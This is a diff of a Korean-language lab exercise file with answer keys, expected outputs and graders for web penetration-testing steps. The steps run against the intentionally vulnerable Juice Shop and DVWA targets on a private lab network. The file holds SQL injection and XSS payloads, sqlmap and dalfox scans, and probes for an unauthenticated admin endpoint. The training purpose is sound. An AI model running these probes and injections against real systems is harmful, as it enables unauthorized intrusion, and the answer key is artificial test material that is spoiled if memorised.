@@ -47,30 +47,29 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 juice vhost 도달 확인 — Host 헤더로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로
-      echo -en "GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) juice vhost 도달·핑거프린팅 — whatweb로 상태코드/서버/타이틀을 한 번에(공격성 레벨 -a1)
+      whatweb -a1 http://juice.el34.lab/
       ```
-      - `nc`(넷캣) = 명령줄 raw HTTP 클라이언트. 요청의 `Host: juice.el34.lab` 줄로 표적 vhost 를 지정한다.
-      - `| head -1 | grep -oE '[0-9]{3}'` = 응답 상태 라인에서 **코드만** 뽑아 `juice=<코드>` 형태로
-        본다(도달성·차단 여부를 빠르게 볼 때 쓴다).
+      - `whatweb` = 웹 핑거프린팅 스캐너. URL 하나로 응답 상태코드(`[200 OK]`)·서버(`Apache`)·프레임워크·타이틀(`Title[OWASP Juice Shop]`)을 한 번에 식별한다.
+      - `-a1` = 공격성(aggression) 레벨 1(stealthy) — 최소 요청으로 표면을 훑는다. att 의 `/etc/hosts` 가 `juice.el34.lab → 192.168.0.161` 이라 요청이 fw→web 경로로 도달한다.
 
       ## ✅ 합격 기준
-      `juice` 출력 시 통과. **근거:** `juice=<코드>` 가 나오면 표적이 fw→web 경로로 살아 있어 점검
-      가능 상태(정상 응답 코드면 착수 가능)임을 뜻한다.
+      `Juice Shop` 출력 시 통과. **근거:** whatweb 결과에 `[200 OK]` 와 `Title[OWASP Juice Shop]` 이 나오면
+      표적이 fw→web 경로로 살아 있고 JuiceShop 으로 라우팅됨이 확인돼 점검 착수 가능임을 뜻한다.
     hint: '도달성'
     category: survey
     points: 8
     answer: |
-      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 juice vhost 도달 확인 — Host 헤더로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로
-      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-    answer_detail: "종합 점검의 표적 = OWASP JuiceShop(의도적으로 취약한 모던 SPA). Host 헤더로 vhost 를 지정해 도달성을 확인하는 점검의 0 단계 — juice=<코드> 출력이면 표적이 fw→web 경로로 살아 있어 점검 가능 상태임을 뜻한다."
+      # 1) juice vhost 도달·핑거프린팅 — whatweb로 상태코드/서버/타이틀을 한 번에(공격성 레벨 -a1)
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/"
+    answer_detail: "종합 점검의 표적 = OWASP JuiceShop(의도적으로 취약한 모던 SPA). whatweb 로 도달성과 핑거프린팅을 한 번에 확인하는 점검의 0 단계 — [200 OK] + Title[OWASP Juice Shop] 이 나오면 표적이 fw→web 경로로 살아 있어 점검 가능 상태임을 뜻한다."
     expected_output: |
-      juice=200
+      http://juice.el34.lab/ [200 OK] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[OWASP Juice Shop], X-Frame-Options[SAMEORIGIN], UncommonHeaders[access-control-allow-origin,x-content-type-options,feature-policy,x-recruiting], IP[192.168.0.161]
     verify:
       type: output_contains
-      expect: 'juice'
+      expect: 'Juice Shop'
       field: stdout
-      semantic: {intent: "대상 점검", success_criteria: ["도달"], acceptable_methods: ["**[OSS] nc raw (권장)**"]}
+      semantic: {intent: "대상 점검", success_criteria: ["도달"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
     target_vm: web
 
   - order: 2
@@ -95,34 +94,38 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 허용 HTTP 메서드 열거 — OPTIONS 요청의 Allow 헤더/상태줄만 확인(PUT/DELETE 열림은 변조 단서)
-      echo -en 'OPTIONS / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | grep -iE '^Allow|^HTTP' | head -2
-      # 2) 강제 브라우징 — 숨은 경로 /ftp 에 직접 접근 → ftp= 응답코드(200이면 정보 노출 단서)
-      echo -en "GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) 허용 HTTP 메서드 열거 — nmap http-methods 스크립트로 Supported Methods 확인(PUT/DELETE 열림은 변조 단서)
+      nmap -p80 --script http-methods juice.el34.lab
+      # 2) 강제 브라우징 — 숨은 경로 /ftp 를 whatweb로 확인([200 OK] + 디렉터리 리스팅이면 정보 노출 단서)
+      whatweb -a1 http://juice.el34.lab/ftp
       ```
-      - 요청 라인 `OPTIONS / HTTP/1.0` = 메서드를 OPTIONS 로 지정. nc 응답은 헤더 포함. `grep -iE '^Allow|^HTTP'`
-        = 상태줄과 `Allow` 헤더만 추려 본다.
+      - `nmap --script http-methods` = 서버가 광고하는 허용 메서드를 열거하는 NSE 스크립트. `Supported Methods:`
+        줄에 `GET HEAD POST OPTIONS` 가 나오며, `PUT`/`DELETE` 가 보이면 파일 변조/삭제 위험 단서다.
+      - `whatweb -a1 .../ftp` = /ftp 를 직접 요청 → `[200 OK]` 와 `Title[listing directory /ftp]` 가 나오면 링크
+        없는 경로가 디렉터리 리스팅으로 노출된 것(정보 노출·접근제어 실패 단서).
 
       ## ✅ 합격 기준
-      `ftp=` 출력 시 통과. **근거:** Allow 메서드 목록과 `ftp=<코드>` 가 나오면 정찰 성공이며,
-      `/ftp` 가 200 이면 정보 노출(접근제어 실패 A01) 단서를 확보한 것이다.
+      `listing directory` 출력 시 통과. **근거:** Supported Methods 목록과 `/ftp` 의 `[200 OK] ... Title[listing
+      directory /ftp]` 가 나오면 정찰 성공이며, /ftp 디렉터리 리스팅은 정보 노출(접근제어 실패 A01) 단서다.
     hint: 'OPTIONS + /ftp'
     category: recon
     points: 10
     answer: |
-      # 1) 허용 HTTP 메서드 열거 — OPTIONS 요청의 Allow 헤더/상태줄만 확인(PUT/DELETE 열림은 변조 단서)
-      ssh att@192.168.0.202 "echo -en 'OPTIONS / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | grep -iE '^Allow|^HTTP' | head -2"
-      # 2) 강제 브라우징 — 숨은 경로 /ftp 에 직접 접근 → ftp= 응답코드(200이면 정보 노출 단서)
-      ssh att@192.168.0.202 "echo -en 'GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-    answer_detail: "정찰(WSTG 정보수집) = HTTP 메서드 열거(OPTIONS → Allow 헤더, W01)와 정보 노출 점검(/ftp 강제 브라우징, W03). 표적의 표면 지도를 그려 이후 단계의 진입점을 찾는다 — ftp= 응답 코드가 출력되면 정찰 성공이며, /ftp 가 200 이면 정보 노출(접근제어 실패 A01)의 단서다."
+      # 1) 허용 HTTP 메서드 열거 — nmap http-methods 스크립트로 Supported Methods 확인(PUT/DELETE 열림은 변조 단서)
+      ssh att@192.168.0.202 "nmap -p80 --script http-methods juice.el34.lab"
+      # 2) 강제 브라우징 — 숨은 경로 /ftp 를 whatweb로 확인([200 OK] + 디렉터리 리스팅이면 정보 노출 단서)
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/ftp"
+    answer_detail: "정찰(WSTG 정보수집) = HTTP 메서드 열거(nmap http-methods → Supported Methods, W01)와 정보 노출 점검(/ftp 강제 브라우징을 whatweb로, W03). juice 는 GET HEAD POST OPTIONS 만 광고(PUT/DELETE 없음)하고 /ftp 는 [200 OK] + Title[listing directory /ftp] 로 디렉터리 리스팅이 노출 — 정보 노출(접근제어 실패 A01)의 단서다."
     expected_output: |
-      HTTP/1.1 204 No Content
-      ftp=200
+      80/tcp open  http
+      | http-methods:
+      |_  Supported Methods: GET HEAD POST OPTIONS
+      http://juice.el34.lab/ftp [200 OK] HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[listing directory /ftp], IP[192.168.0.161]
     verify:
       type: output_contains
-      expect: 'ftp='
+      expect: 'listing directory'
       field: stdout
-      semantic: {intent: "HTTP/정보수집", success_criteria: ["메서드+정보"], acceptable_methods: ["**[OSS] OPTIONS+/ftp (권장)**"]}
+      semantic: {intent: "HTTP/정보수집", success_criteria: ["메서드+정보"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
     target_vm: web
 
   - order: 3
@@ -254,38 +257,44 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) SQLi(1' UNION SELECT 1--)를 dvwa(차단 모드)에 주입 → sqli= 응답코드(%27=작은따옴표, %20=공백)
-      echo -en "GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) XSS(<script>alert(1)</script>)를 dvwa에 주입 → xss= 응답코드
-      echo -en 'GET /?q=<script>alert(1)</script> HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 3) 해석 — SQLi(942)/XSS(941) 모두 dvwa 403 차단(차단은 WAF가 막은 것, 근본은 입력검증)
-      # → SQLi(942)/XSS(941) → dvwa 403
+      # 1) SQLi를 sqlmap으로 dvwa(차단 모드)에 주입 → WAF가 403으로 차단(protection mechanism 감지)
+      sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring
+      # 2) XSS를 dalfox로 dvwa에 주입 → WAF Unknown (HTTP 403) 감지 + bypass encoders 제안
+      dalfox url --url "http://dvwa.el34.lab/vulnerabilities/xss_r/?name=test"
+      # 3) 해석 — SQLi(942)/XSS(941) 모두 dvwa WAF 403 차단(차단은 WAF가 막은 것, 근본은 입력검증)
+      # → SQLi(942)/XSS(941) → dvwa WAF 403 차단
       ```
-      - 첫 줄: URL 인코딩된 SQLi(`' UNION SELECT 1--`)를 `id` 파라미터에 주입(`%27`=작은따옴표,
-        `%20`=공백). 둘째 줄: XSS(`<script>alert(1)</script>`)를 `q` 파라미터에 주입.
+      - `sqlmap` = 자동 SQL Injection 도구(`--batch` 무인·`--level/--risk` 로 시도 깊이↑). dvwa 는 ModSec WAF 가
+        주입 패턴을 403 으로 막아 `all tested parameters do not appear to be injectable ... protection mechanism (e.g. WAF)` 로 보고한다(차단 시연).
+      - `dalfox url --url` = 자동 XSS 스캐너. dvwa 로 보내면 `WAF Unknown (HTTP 403) detected` 로 WAF 차단을
+        감지하고 우회 인코더(2url, unicode, zwsp)를 제안한다.
 
       ## ✅ 합격 기준
-      `sqli=` 출력 시 통과. **근거:** `sqli=<코드> xss=<코드>` 가 나오면 두 주입이 전송된 것이고,
-      DVWA 차단 모드면 둘 다 403(WAF 차단)이다(차단은 WAF 가 막은 것, 근본 방어는 입력 검증).
+      `WAF` 출력 시 통과. **근거:** sqlmap 이 `protection mechanism (e.g. WAF)` 를, dalfox 가 `WAF Unknown (HTTP
+      403) detected` 를 보고하면 두 주입이 dvwa ModSec WAF(942 SQLi/941 XSS)에 403 으로 차단됨을 확인한 것이다.
     hint: 'SQLi + XSS'
     category: manipulation
     points: 12
     answer: |
-      # 1) SQLi(1' UNION SELECT 1--)를 dvwa(차단 모드)에 주입 → sqli= 응답코드(%27=작은따옴표, %20=공백)
-      ssh att@192.168.0.202 "echo "sqli=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')""
-      # 2) XSS(<script>alert(1)</script>)를 dvwa에 주입 → xss= 응답코드
-      ssh att@192.168.0.202 "echo -en 'GET /?q=<script>alert(1)</script> HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-      # 3) 해석 — SQLi(942)/XSS(941) 모두 dvwa 403 차단(차단은 WAF가 막은 것, 근본은 입력검증)
-      # → SQLi(942)/XSS(941) → dvwa 403
-    answer_detail: "입력 취약점(WSTG 입력 검증, OWASP A03 주입) = SQLi(ModSec 942)와 XSS(ModSec 941)를 검증 없이 신뢰한 결함. DVWA(차단 모드)에서는 WAF 가 403 으로 막고, JuiceShop(탐지만)에서는 200 통과. sqli=/xss= 코드가 출력되면 점검 성공 — 단, 403 차단은 WAF 가 패턴을 막은 것이지 앱이 안전해진 것은 아니다(근본 방어는 입력 검증·parameterized query)."
+      # 1) SQLi를 sqlmap으로 dvwa(차단 모드)에 주입 → WAF가 403으로 차단(protection mechanism 감지)
+      ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring'
+      # 2) XSS를 dalfox로 dvwa에 주입 → WAF Unknown (HTTP 403) 감지 + bypass encoders 제안
+      ssh att@192.168.0.202 'dalfox url --url "http://dvwa.el34.lab/vulnerabilities/xss_r/?name=test"'
+      # 3) 해석 — SQLi(942)/XSS(941) 모두 dvwa WAF 403 차단(차단은 WAF가 막은 것, 근본은 입력검증)
+      # → SQLi(942)/XSS(941) → dvwa WAF 403 차단
+    answer_detail: "입력 취약점(WSTG 입력 검증, OWASP A03 주입) = SQLi(ModSec 942)와 XSS(ModSec 941)를 검증 없이 신뢰한 결함. DVWA(차단 모드)에서는 sqlmap 이 protection mechanism(e.g. WAF)을, dalfox 가 WAF Unknown (HTTP 403) 을 보고 = WAF 가 403 으로 차단. JuiceShop(탐지만)에서는 같은 주입이 200 통과. 단, 403 차단은 WAF 가 패턴을 막은 것이지 앱이 안전해진 것은 아니다(근본 방어는 입력 검증·parameterized query)."
     expected_output: |
-      sqli=403 xss=403
-      → SQLi(942)/XSS(941) → dvwa 403
+      [CRITICAL] all tested parameters do not appear to be injectable. ... if you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' ...
+      [WARNING] HTTP error codes detected during run:
+      403 (Forbidden) - 887 times
+      WAF Unknown (HTTP 403) detected (confidence: 40%, evidence: Provocation probe returned HTTP 403)
+        └── bypass encoders: 2url, unicode, zwsp
+      → SQLi(942)/XSS(941) → dvwa WAF 403 차단
     verify:
       type: output_contains
-      expect: 'sqli='
+      expect: 'WAF'
       field: stdout
-      semantic: {intent: "입력 취약점", success_criteria: ["SQLi/XSS"], acceptable_methods: ["**[OSS] SQLi+XSS (권장)**"]}
+      semantic: {intent: "입력 취약점", success_criteria: ["SQLi/XSS"], acceptable_methods: ["**[OSS] sqlmap (권장)**"]}
     target_vm: web
 
   - order: 6
@@ -309,37 +318,39 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) 토큰(인증 헤더) 없이 관리 엔드포인트 호출 → admincfg= 응답코드(200이면 서버가 권한검사 누락 = A01)
-      echo -en "GET /rest/admin/application-configuration HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      # 2) /ftp 강제 브라우징도 호출 → ftp= 응답코드(200이면 접근제어 실패 추가 증거)
-      echo -en "GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+      # 1) 토큰(인증 헤더) 없이 관리 엔드포인트를 whatweb로 호출 → [200 OK]면 서버가 권한검사 누락(A01)
+      whatweb -a1 http://juice.el34.lab/rest/admin/application-configuration
+      # 2) /ftp 강제 브라우징도 whatweb로 → [200 OK] + 디렉터리 리스팅이면 접근제어 실패 추가 증거
+      whatweb -a1 http://juice.el34.lab/ftp
       # 3) 해석 — admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
       # → admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
       ```
-      - 토큰(인증 헤더) 없이 관리 엔드포인트를 호출한다 — 200 이면 권한 검사를 서버가 빼먹은 것이다.
+      - 토큰(인증 헤더) 없이 관리 엔드포인트를 whatweb 로 호출한다 — `[200 OK]` 면 권한 검사를 서버가 빼먹은
+        것이고, whatweb 가 노출된 설정에서 `Email[donotreply@owasp-juice.shop]` 같은 내부 정보까지 파싱해 낸다.
 
       ## ✅ 합격 기준
-      `admincfg=200` 출력 시 통과. **근거:** 인증 없이 관리 엔드포인트가 200 으로 설정을 내주면 서버가
-      권한 검사를 빼먹은 무인증 관리 노출(A01) 입증 성공이다.
+      `owasp-juice.shop` 출력 시 통과. **근거:** 인증 없이 관리 엔드포인트가 `[200 OK]` 로 설정을 내주고
+      whatweb 가 그 안의 `Email[donotreply@owasp-juice.shop]` 을 파싱하면 무인증 관리 노출(A01) 입증 성공이다.
     hint: 'admin-config 무인증'
     category: manipulation
     points: 12
     answer: |
-      # 1) 토큰(인증 헤더) 없이 관리 엔드포인트 호출 → admincfg= 응답코드(200이면 서버가 권한검사 누락 = A01)
-      ssh att@192.168.0.202 "echo -en 'GET /rest/admin/application-configuration HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
-      # 2) /ftp 강제 브라우징도 호출 → ftp= 응답코드(200이면 접근제어 실패 추가 증거)
-      ssh att@192.168.0.202 "echo -en 'GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
+      # 1) 토큰(인증 헤더) 없이 관리 엔드포인트를 whatweb로 호출 → [200 OK]면 서버가 권한검사 누락(A01)
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/rest/admin/application-configuration"
+      # 2) /ftp 강제 브라우징도 whatweb로 → [200 OK] + 디렉터리 리스팅이면 접근제어 실패 추가 증거
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/ftp"
       # 3) 해석 — admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
       # → admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
-    answer_detail: "접근제어 점검(WSTG 인가, OWASP A01 — 2021 Top 10 1 위) = 인증 없이 관리 엔드포인트(/rest/admin/application-configuration)가 200 으로 설정을 노출하고 /ftp 강제 브라우징도 200 으로 접근됨을 확인. 서버가 권한 검사를 빼먹은 접근제어 실패의 증거 — admincfg=200 이면 입증 성공이며 본 시험에서 High 로 평가한다."
+    answer_detail: "접근제어 점검(WSTG 인가, OWASP A01 — 2021 Top 10 1 위) = 인증 없이 관리 엔드포인트(/rest/admin/application-configuration)가 [200 OK] 로 설정을 노출(whatweb 가 Email[donotreply@owasp-juice.shop] 등 내부 정보까지 파싱)하고 /ftp 강제 브라우징도 [200 OK] 디렉터리 리스팅으로 접근됨. 서버가 권한 검사를 빼먹은 접근제어 실패의 증거 — 본 시험에서 High 로 평가한다."
     expected_output: |
-      admincfg=200 ftp=200
+      http://juice.el34.lab/rest/admin/application-configuration [200 OK] Apache[2.4.52], Email[donotreply@owasp-juice.shop], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161], UncommonHeaders[access-control-allow-origin,x-content-type-options,feature-policy,x-recruiting], X-Frame-Options[SAMEORIGIN]
+      http://juice.el34.lab/ftp [200 OK] Title[listing directory /ftp], IP[192.168.0.161]
       → admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
     verify:
       type: output_contains
-      expect: 'admincfg=200'
+      expect: 'owasp-juice.shop'
       field: stdout
-      semantic: {intent: "접근제어 점검", success_criteria: ["무인증 관리"], acceptable_methods: ["**[OSS] admin-config (권장)**"]}
+      semantic: {intent: "접근제어 점검", success_criteria: ["무인증 관리"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
     target_vm: web
 
   - order: 7
